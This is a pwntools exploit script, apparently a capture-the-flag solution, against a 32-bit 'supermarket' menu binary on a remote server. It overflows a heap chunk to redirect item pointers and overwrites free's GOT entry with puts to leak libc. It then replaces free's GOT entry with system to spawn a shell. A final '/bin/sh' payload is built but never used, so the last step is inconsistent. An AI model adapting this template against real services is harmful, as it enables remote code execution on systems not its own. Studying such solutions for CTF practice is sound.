#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "supermarket"
libFile  = "libc.so.6"

remoteIp = "111.198.29.45"
remotePort = 57966

LOCAL = 0
LIBC  = 1

r   =  lambda x : io.recv(x)
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(index, size, text):
	sla('>> ', str(1))
	sla(':', str(index))
	sla(':', str(0))
	sla(':', str(size))
	sla(':', text)

def rm(index):
	sla('>> ', str(2))
	sla(':', str(index))

def dp():
	sla('>> ', str(3))	

def md(index, size, text):
	sla('>> ', str(5))	
	sla(':', str(index))
	sla(':', str(size))
	sla(':', text)

def q():
	sa('>> ', str(6))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0, 0x80, '0' * (0x80 - 1))
	ad(1, 0x10, '1' * (0x10 - 1))
	md(0, 0x90, '')
	ad(2, 0x10, '2' * (0x10 - 1))
	p = p32(0x32) + p32(0) * 4
	p += p32(0x10) + p32(exe.got['free'])
	p += '\x19'
	md(0, 0x80, p) # modify dscription addr as free got addr
	p2 = p32(exe.plt['puts'])
	md(2, 0x10, p2) #modify free got addr as puts got addr

	# leaking
	p3 = p32(0x32) + p32(0) * 4
	p3 += p32(0x10) + p32(exe.got['atoi'])
	p3 += '\x19'
	md(0, 0x80, p3)

	rm(2) #puts atoi addr in libc
	atoi_addr = u32(r(4))
	li('libc_base: ' + hex(atoi_addr))
	libc_base = atoi_addr - lib.sym['atoi']
	li('libc_base: ' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']
	sh_addr = libc_base + 0x0015902b

	#modify got addr as system
	ad(3, 0x10, '3' * (0x10 - 1))

	p4 = p32(0x32) + p32(0) * 4
	p4 += p32(0x10) + p32(0x0)
	p4 += p32(0x19) + p32(0x0) * 5
	
	p4 += p32(0x21) # modify item 3

	p4 += p32(0x33) #3
	p4 += p32(0x0) * 4
	p4 += p32(0x10)
	p4 += p32(exe.got['free']) + '\x19'
	
	md(0, 0x80, p4)
	

	p5 = p32(sys_addr)
	md(3, 0x10, p5) # modify free got table as system

	#db()
	
	# call system with /bin/sh
	p6 = p32(0x32) + p32(0) * 4
	p6 += p32(0x10) + p32(0x0)
	p6 += p32(0x19) + p32(0x0) * 5
	
	p6 += p32(0x21) # modify item 3
	p6 += p32(0x33) #3
	p6 += p32(0x0) * 4
	p6 += p32(0x10)
	p6 += p32(sh_addr) + '\x19'

	rm(3) #exec system


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	exe = ELF(exeFile)
	if LOCAL:
		if LIBC:
			lib = ELF('/lib/i386-linux-gnu/libc.so.6')
		#io = exe.process(env = {"LD_PRELOAD" : libFile})
		io = exe.process()
	
	else:
		io = remote(remoteIp, remotePort)
		if LIBC:
			lib = ELF(libFile)
	
	exploit()
	finish()

